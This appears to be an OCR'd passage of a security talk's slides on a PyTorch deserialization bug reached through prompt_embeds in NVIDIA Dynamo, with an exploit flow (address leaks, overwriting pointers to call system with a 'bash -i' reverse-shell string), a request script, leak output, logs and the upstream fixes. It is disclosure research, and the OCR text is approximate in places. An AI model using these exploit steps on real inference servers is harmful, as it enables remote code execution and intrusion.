37, 136390981451776, 136368499982480,
0 37 136395276419072 .
136368499982480, 0, 37, [*] Done! Check if command executed on target.
136399571386368, 136368499982480, 0,
37, 136403866353664, 136368499982480,
0, Sq 136408161320960,
136368499982480, 0, 37,
136412456288256, 136368499982480, 136368650380848,
121
```

## Slide 122

### **Attack Flow**

122


> Recovered by OCR — confidence 84/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
"Attack Flow
ROUND 1 ROUND 2
Leak libtorch_python.so Leak libtorch_cpu.so
e The vptr of StorageImpl > libtorch_python.so e Modify data_ —GOTin libtorch_python.so > libtorch_cpu.so
e Do not need to modify anything e Modify deleter_ — ret gadget
X No system@plt in libtorch_python.so Y libtorch_cpu.so has system@plt
v
ROUND 3
Code Execution
e Modify data_ — "bash -c 'bash -i ..."
e Modify deleter — system@ptt
3< RCE
122
```

## Slide 123

123

## Slide 124

### **Auto-Download Latest Version**

Not affected after PyTorch released the fixed version

124


> Recovered by OCR — confidence 84/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
" Auto-Download Latest Version
Not affected after PyTorch released the fixed version
ComfyUI / requirements.txt (9
, comfyanonymous Fix black image on turing when using int4 models. (#14864) xX
Code Blame 37 lines (36 loc) - 531 Bytes : ©
1 comfyui-f rontend—-package==1.45.20
3 comfyui-—embedded-docs==0.5.7
4 torch
5 torchsde
6 torchvision
7 torchaudio
8
124
```

## Slide 125

### **Pwn2Own 2026**

125


> Recovered by OCR — confidence 92/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“Pwn2Own 2026
ANNOUNCING PWN2OWN BERLIN FOR
2026
March 12, 2026 | Dustin Childs
| Cash Prize
Chroma $20,000
Oracle Autonomous Al Target
Database $40,000 Ollama $40,000
Megatron Bridge $20,000
LiteLLM $40,000
NV Container Toolkit $50,000
Anthropic Claude Code $40,000 sii
OpenAl Codex $40,000
Cursor $30,000 125
```

## Slide 126

### **What is Dynamo?**

126


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“What is Dynamo?
Al Inference
NVIDIA Dynamo
Scale and Serve Generative Al, Fast. Bs
NVIDIA Dynamo
High-throughput, low-latency inference framework designed for serving generative Al and reasoning models in
multi-node distributed environments.
126
```

## Slide 127

### **Started Bug Hunting on Announcement Day**

127


> Recovered by OCR — confidence 86/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“Started Bug Hunting on Announcement Day
© TrendAI Zero Day Initiative @ @thezdi - 3138 Ju
Announcing #Pwn2Own Berlin 2026! We've got 10 categories for targets,
including an expanded #A\ target list. We have 4 Al categories - including
coding agents (looking at you #Claude). More than $1,000,000 in cash &
prizes available. Read the details at
a) Zero Day Initiative — Announcing Pwn2Own Berlin ...
a = If you just want to read the contest rules, click here .
ag ee Willkommen zuriick, meine Damen und Herren, zu...
Mar 5 Dynamo Release v0.9.1
© saturley-hall
© v0.9.1
© ebcbd61@ Dynamo v0.9.1
Compare wv
Release Notes
127
```

## Slide 128

### **Three Backends**

128


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
"Three Backends
Dynamo is inference engine agnostic (supports TRT-LLM, vLLM, SGLang) and provides:
Disaggregated Prefill & Decode — Maximizes GPU throughput with latency/throughput trade-offs
Dynamic GPU Scheduling -— Optimizes performance based on fluctuating demand
LLM-Aware Request Routing — Eliminates unnecessary KV cache re-computation
Accelerated Data Transfer — Reduces inference response time using NIXL
KV Cache Offloading — Leverages multiple memory hierarchies for higher throughput
Backend Feature Support
SGLang TensorRT-LLM vLLM
Best For High-throughput serving Maximumperformance _ Broadest feature coverage
Disaggregated Serving
KV-Aware Routing
SLA-Based Planner
KVBM |
Multimodal
Tool Calling
128
```

## Slide 129

### **Try to Deploy**

129


> Recovered by OCR — confidence 85/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“Try to Deploy
# SGLang oO
docker run —-gpus all -—-network host —-rm —it nvcr.io/nvidia/ai—dynamo/sglang-runtime:0.9.1
# TensorRT-LLM
docker run —-gpus all —-network host -—-rm -it nvcr.io/nvidia/ai—dynamo/tensorrtllm-runtime:0.9.
# vLLM
docker run —-gpus all —-network host --rm —it nvcr.io/nvidia/ai—dynamo/vllm-runtime:0.9.1
Dynamo: A Datacenter Scale Distributed Inference Serving Framework
This is a minimum runtime container for interacting with Dynamo via our CLI
tools.
Try the following to begin interacting with a model:
>|python -m dynamo.frontend [--http-port 8000]
>|python -m dynamo.{vllm,sglang,trtllm} -—-model Qwen/Qwen2.5-3B-Instruct
To run more complete deployment examples, instances of etcd and nats need to be
accessible within the container. This is generally done by connecting to
existing etcd/nats services from the host or other containers. For simple
cases, you can start them in the container as well:
>|nats-server -js &
>letcd -—-listen-client-urls http://0.0.0.0:2379 —-advertise-client-urls http://0.0.0.0:2379 --data-dir /tmp/etcd & 129
```

## Slide 130

### **Errors When Run Directly**

130


> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“Errors When Run Directly
[dynamo@gpu-v100: /workspace$ python -m dynamo. frontend
ERROR Could not connect to etcd. Pass “--store-kv ..°
://localhost:2379
Traceback (most recent call last):
File "<frozen runpy>", line 198, in _run_module_as_main
File "<frozen runpy>", line 88, in _run_code
File "/opt/dynamo/venv/lib/python3.12/site-packages/dynamo/frontend/__main__.py", line 7, in <module>
main()
File "/opt/dynamo/venv/lib/python3.12/site-packages/dynamo/frontend/main.py", line 464, in main
File "/opt/dynamo/venv/1lib/python3.12/site-packages/uvloop/__init__.py", line 109, in run
return __asyncio.run(
File "/usr/lib/python3.12/asyncio/runners.py", line 194, in run
return runner.run(main)
File "/usr/lib/python3.12/asyncio/runners.py", line 118, in run
return self._loop.run_until_complete(task)
File "uvloop/loop.pyx", line 1518, in uvloop.loop.Loop.run_until_complete
File "/opt/dynamo/venv/lib/python3.12/site-packages/uvloop/__init__.py", line 61, in wrapper
return await main
File "/opt/dynamo/venv/lib/python3.12/site-packages/dynamo/frontend/main.py", line 371, in async_main
runtime = DistributedRuntime(loop, flags.store_kv, flags.request_plane, enable_nats)
Exception: Unable to create lease. Check etcd server status at http://localhost:2379
130
```

## Slide 131

### **Deploy Successfully**

131


> Recovered by OCR — confidence 91/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“Deploy Successfully
nats-server -js &
etcd --listen-client-urls http://@.0.0.0:2379
-—-data-dir /tmp/etcd &
python -m dynamo.frontend &
python -m dynamo.vllm --model Qwen/Qwen3-2@.6B
INFO Initializing KV store discovery backend
INFO Initializing NetworkManager with TCP request plane mode=tcp host=192.
168.1.9 port-OS-assigned
INFO Starting HTTP(S) service protocol="HTTP" address="0.0.0.0:8000"
Cannot connect to ModelExpress server: Transport error: transport error. Using direct download.
INFO Downloading model 'Qwen/Qwen3-@.6B' using provider: Hugging Face
ARN “ignore_weights* is set to true. All the model weight files will be ignored!
INFO Downloading model from Hugging Face: Qwen/Qwen3-@.6B
INFO Using cache directory: "/home/dynamo/.cache/huggingface/hub"
INFO Got model info: RepoInfo { siblings: [Siblings { rfilename: ".gitatt
ributes" }, Siblings { rfilename: "LICENSE" }, Siblings { rfilename: "README.md" }, Siblings { rfilename: "config.json" }, Siblings { rfilename: "g
eneration_config.json" }, Siblings { rfilename: "merges.txt" }, Siblings { rfilename: "model.safetensors" }, Siblings { rfilename: "tokenizer.json"
}, Siblings { rfilename: "tokenizer_config.json" }, Siblings { rfilename: "vocab.json" }], sha: "c1899de289a04d12100db370d81485cdf75e47ca" }
INFO Downloaded model files for Qwen/Qwen3-0.6B
INFO ModelExpress download completed successfully for model: Qwen/Qwen3-0.6B
INFO chat endpoints enabled
INFO completion endpoints enabled
INFO Chat completions is ready
INFO Completions is ready
INFO added_model_model_name="Qwen/Qwen3-@.6B"_namespace="dynamo" 131
```

## Slide 132

### **Architecture**

132


> Recovered by OCR — confidence 87/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
"Architecture
vLLM Native NVIDIA Dynamo
Client Client
Dynamo Frontend
HTTP Server ,
Python - FastAPI - uvicorn HTTP Server
Rust - Axum - Tokio
vLLM Worker (Python)
All in one Python process rene Bae + AsyncLLM Engine
Frontend & Worker are separate processes
GPU Inference Core
132
```

## Slide 133

### **The Vuln**

133


> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
"The Vuln
Rust Frontend
HTTP — Validate — Route
Rust Frontend
. handler_completions()
. completions_single()
. engine.generate()
. Preprocessor (validate)
. PushRouter — TCP send
Python Worker
decode prompt_embeds
Python Worker
6. generate()
7. _generate_token_mode()
8. _build_prompt()
9. _decode_prompt_embeds()
torch.load()
weights_only=True
Deserialization
10. base64 decode
11. torch.load(buf)
weights_only=True ¥
133
```

## Slide 134

### **Leak Achieved**

134


> Recovered by OCR — confidence 88/100 on the text kept, 86/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
“Leak Achieved
import requests
import base64
url = "http://127.0.0.1:8000/v1/completions"
headers = {
}
content=
"Content-Type": "application/json"
with open("tensor.pt","rb") as f:
content=base64. b64encode(f.read()).decode()
data = {
}
response = requests.post(url, headers=headers,
"prompt": x",
‘dynamo@iv-yeqdbeqém8ay8n848rzF: /tmp/exp$ python3 send.py ]
{"message":"Failed to fold completions stream for @cd43495-4ceb-4491-aa19-f6af16@a8e96: unknown variant “error: Invalid
prompt_embeds: Failed to decode prompt_embeds as PyTorch tensor: Weights only load failed. In PyTorch 2.6, we changed th
e default value of the ‘weights_only* argument in “torch.load* from “False* to ‘True’. Re-running ‘torch.load* with ‘wei
ghts_only* set to ‘False’ will likely succeed, but it can result in arbitrary code execution. Do it only if you got the
file from a trusted source.\nPlease file an issue with the following so that we can make ‘weights_only=True~ compatible
with your use case: WeightsUnpickler error: \n\nOnly persistent_load of storage is allowed, but got tensor([
OF 97,\n 322170851, 4285345213156097082, 110425377238528, \n
33, e, @,\n 8, @1)\n\nCheck the docu
mentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/
generated/torch.load.html.*, expected one of ‘eos’, ‘length’, ‘stop’, ‘error’, ‘cancelled’, “content_filter’ at line 1c
olumn 1276","type":"Internal Server Error", "code":500}
INFO TCP request plane server started actual_addr=172.31.2.19:33777 actual_port-33777
INFO Registered endpoint ‘unload_lora' with shared TCP server on 172.31.2.19:337
INFO Registered endpoint 'list_loras' with shared TCP server on 172.31.2.19:3377
INFO Registered endpoint 'clear_kv_blocks' with shared TCP server on 172.31.2.19
INFO Registered endpoint 'load_lora' with shared TCP server on 172.31.2.19:33777
INFO Registered endpoint 'generate' with shared TCP server on 172.31.2.19:33777
ERROR Failed to decode prompt_embeds: Weights only load failed. In PyTorch 2.6, we changed the default value of th
d* from ‘False to ‘True’. Re-running “torch.load* with ‘weights_only* set to ‘False’ will likely succeed, but it can result in arbitrary code execution. Do it only if you go
Please file an issue with the following so that we can make ‘weights_only=True* compatible with your use case: WeightsUnpickler error:
Only persistent_load of storage is allowed, but got tensor({ 1, 2, 3,
10, 9, 97,
322170851, 4285345213156097082, 110425377238528,
Check the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.
ERROR Failed to process prompt_embeds for request @cd43495-4ceb-4491-aa19-féaf160a8e96: Failed to decode prom
ly load failed. In PyTorch 2.6, we changed the default value of the ‘weights_only’ argument in ‘torch.load’ from ‘False’ to ‘True’. Re-running ‘torch.load* with ‘weights_only
; = t it can result in arbitrary code execution. Do it only if you got the file from a trusted source.
json=data) u Su: y xeCU y you gi us Qu:
Please file an issue with the following so that we can make ‘weights_only=True* compatible with your use case: WeightsUnpickler error:
Only persistent_load of storage is allowed, but got tensor({ 1, 2, 3,
10, 9, 97,
322170851, 4285345213156097082, 110425377238528,
a the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.
134
```

## Slide 135

### 🤣 **No PIE too!**

135

## Slide 136

136


> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
~ — dynamo@iv-yeqdb0q6m8ay8n848rzf: jworkspace — ssh root@118.196.114.94 dynamo@iv-yeqdb0qém8ay8n848rzf: /workspace — ssh root@118.196.114.94 +
INFO torch.compile takes 6.59 s in total
NFC Available KV cache memory: 17.42 GiB
GPU KV cache size: 163,088 tokens
Maximum concurrency for 40,96@ tokens per request: 3.98x
NIXL is available
NF Creating v1 connector with name: NixlConnector and engine_id: 9142c798-383c-4a95-971f-6641ad72d@cb
Initializing KVConnectorBase_V1. This API is experimental and subject to change in the future as we iterate the design.
NF Initializing NIXL wrapper
INFO Initializing NIXL worker 9142c798-383c-4a95-971f-6641ad72d@cb
2026-07-11 11:51:27 NIXL INFO _api.py:363 Backend UCX was instantiated
2026-07-11 11:51:27 NIXL INFO _api.py:253 Initialized NIXL agent: 9a5bec44-89b8-4ee8-874d-808d424dedee
INFO NixlConnector setting KV cache layout to HND for better xfer performance.
INFO Registering KV_Caches. use_mla: False, kv_buffer_device: cuda, use_host_buffer: False
Capturing CUDA graphs (mixed prefill-decode, PIECEWISE): 100%s| I]t]. mm” | 51/51 [00:01<00:00, 27.32it/s]
Capturing CUDA graphs (decode, FULL): 10076 | i” | 35/35 [30:01<00:00, 27.57it/s]
INFO Graph capturing finished in 4 secs, took @.47 GiB
NF init engine (profile, create kv cache, warmup model) took 15.5@ seconds
INFO NIXL is available
NF Creating v1 connector with name: NixlConnector and engine_id: 9142c798-383c-4a95-971f-6641ad72d@cb
Initializing KVConnectorBase_V1. This API is experimental and subject to change in the future as we iterate the design.
INF Initializing NIXL Scheduler 9142c798-383c-4a95-971f-6641ad72d@cb
) Starting ZMQ publisher thread
Asynchronous scheduling is enabled.
O @7-11 11:51:40 [nixl_connector.py:97] NIXL is available
INF VllmWorker for Qwen/Qwen3-@.6B has been initialized
INFO VllmEngineMonitor initialized and health check task started.
INFO KV event publisher for dp_rank=@ subscribing to vLLM at tcp://127.0.0.1:20080
Initializing KvEventPublisher for worker 7587896117485211144 in component backend
Worker reading KV events for dp_rank=@ from tcp://127.0.0.1:20080
Registered engine routes: /engine/sleep, /engine/wake_up
Registering model with endpoint types: chat, completions
NF Getting engine runtime configuration metadata from vLLM engine for chat,completions..
INFO Cache config values: {'num_gpu_blocks': 10193}
NF Scheduler config values: {'max_num_seqs': 256, 'max_num_batched_tokens': 2048}
INFO KvStoreDiscovery::register: EventChannel bucket=v1/event_channels, key=dynamo//kv_metrics/694d9f5103458e08
Cannot connect to ModelExpress server: Transport error: transport error. Using direct download.
Downloading model 'Qwen/Qwen3-@.6B' using provider: Hugging Face
Downloading model from Hugging Face: Qwen/Qwen3-0.6B
Using cache directory: "/home/dynamo/.cache/huggingface/hub"
EventPublisher registered with discovery topic=kv_metrics transport=Nats instance_id=7587896117485211144
Got model info: RepoInfo { siblings: [Siblings { rfilename: ".gitattributes" }, Siblings { rfilename: "LICENSE" }, Siblings { rf
ilename: "README.md" }, Siblings { rfilename: "config.json" }, Siblings { rfilename: "generation_config.json" }, Siblings { rfilename: "merges.txt" }, Siblings { rfilename: "model.safetensors" }, Siblings {
rfilename: "tokenizer.json" }, Siblings { rfilename: "tokenizer_config.json" }, Siblings { rfilename: "vocab.json" }], sha: "c1899de289a04d1210@db370d81485cdf75e47ca" }
INFO Downloaded model files for Qwen/Qwen3-0.6B
INF ModelExpress download completed successfully for model: Qwen/Qwen3-0.6B
INFO Registered base model 'Qwen/Qwen3-@.6B' MDC
NF Creating TCP request plane server bind_addr=172.31.2.19:@ port_source="0S-assigned"
Initializing TCP server with dispatcher (concurrency=1500, queue=6000)
Started TCP worker dispatcher with concurrency limit 1500
Binding TCP server to 172.31.2.19:0
TCP server bound successfully requested=172.31.2.19:@ actual=172.31.2.19:44251
TCP request plane server started actual_addr=172.31.2.19:44251 actual_port=44251
Registered endpoint 'clear_kv_blocks' with shared TCP server on 172.31.2.19:44251
Registered endpoint 'load_lora' with shared TCP server on 172.31.2.19:44251
Registered endpoint 'unload_lora' with shared TCP server on 172.31.2.19:44251
INF Registered endpoint 'list_loras' with shared TCP server on 172.31.2.19:44251 136
INFO Registered endpoint 'generate' with shared TCP server on 172.31.2.19:44251
```

## Slide 137

### **This Target Remains Unchallenged**

137

https://www.zerodayinitiative.com/blog/2026/5/13/pwn2own-berlin-2026-the-full-schedule


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
“This Target Remains Unchallenged
Pwn2Own Berlin 2026: The Full Schedule
f MAY 13, 2026
& DUSTIN CHILDS
Willkommen! (Welcome!) Pwn2Own Berlin 2026 has arrived at OffensiveCon, and the world’s top security researchers
are ready. This year’s enterprise-focused competition features Al Databases, Coding Agents, Local Inferences, and a
separate category for NVIDIA products.
Earlier today, we held the random draw to determine attempt order. Below is the official schedule. All times are Berlin
local time (CET) and may change as the competition progresses. Check back for live updates.
In case you missed it, you can watch the draw here.
https://www.zerodayinitiative.com/blog/2026/5/13/pwn2own-berlin-2026-the-full-schedule
```

## Slide 138

**Fix**

138

https://github.com/ai-dynamo/dynamo/pull/8248/changes


> Recovered by OCR — confidence 88/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
a
a @@ -1351,6 +1351,22 @@ def _build_prompt_from_request (
1351 embedding_sequence_length = None
1352
1353 if “prompt_embeds" in request and
1354 trv:
1351
1352
1353
1354
1355
1356
1357
1358
1359
1360
1361
1362
1363
1364
1365
1366
1367
1368
1369
1370
embedding_sequence_length = None
if "prompt_embeds" in request and
request ["prompt_embeds"]:
if not
self.config.engine_args.enable_prompt_embeds:
"Set
*--enable-prompt-embeds* to allow
‘prompt_embeds* in request."
{log_prefix. lower().strip() or 'request'} "
)
logger.e
f"Rejected prompt_embeds for
f"{request_id}: {msg}"
)
return (
None
None
{
prompt_embeds: {msg}",
trv:
rror(
“finish_reason": f"error: Invalid
“token_ids":
https://github.com/ai-dynamo/dynamo/pull/8248/changes
138
```

## Slide 139

**Fix**

139

https://github.com/ai-dynamo/dynamo/pull/8228/changes


> Recovered by OCR — confidence 92/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
a
F
Ix
1124
1125
1126
1127
1128
1129
1130
1131
1132
1133
1134
1135
1136
1137
1138
1139
1140
1141
1142
buffer = io.BytesI0(embeds_bytes)
embeddings_tensor = torch. load(buffer,
weights_only=True)
# Step 3: Validate it's a tensor
if not isinstance(embeddings_tensor,
raise ValueError(
f"prompt_embeds must be a torch.Tensor,
got {type(embeddings_tensor) }"
)
f"Decoded PyTorch format embeddings: shape=
{embeddings_tensor.shape}, "
f"dtype={embeddings_tensor.dtype}, size=
{len(embeds_bytes)} bytes"
) 1124
1125
return embeddings_tensor 1126
1127
1128
except binascii.Error as e: 1129
logger.error(f"Invalid base64 encoding in 1130
prompt_embeds: {e}")
raise ValueError(f"Invalid base64 encoding in 1131
prompt_embeds: {e}")
1132
+
20 + from vllm.renderers.embed_utils import
safe_load_prompt_embeds
> Comment on lines R1121 to R1124 Resolved
if self.model_config is None:
raise ValueError("ModelConfig is unavailable for
prompt_embeds validation.")
try:
return safe_load_prompt_embeds(
self.model_config,
prompt_embeds_base64.encode()
)
https://github.com/ai-dynamo/dynamo/pull/8228/changes
139
```

## Slide 140

# Summary

140

## Slide 141

141


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
a
Previous cognition
Model poisoning
Known attack vector
New findings
Embeds input
Input-level manipulation
Dynamic model
Runtime model switching
141
```

## Slide 142

As more and more people focus on AI security, simple Python-level vulnerabilities will become increasingly rare.

## **Summary**

However, for performance reasons, many low-level AI components still have to be implemented in C/C++.

As a result, memory vulnerabilities will gradually attract more attention in the field of AI security.

142

## Slide 143

2026

# Thanks

143
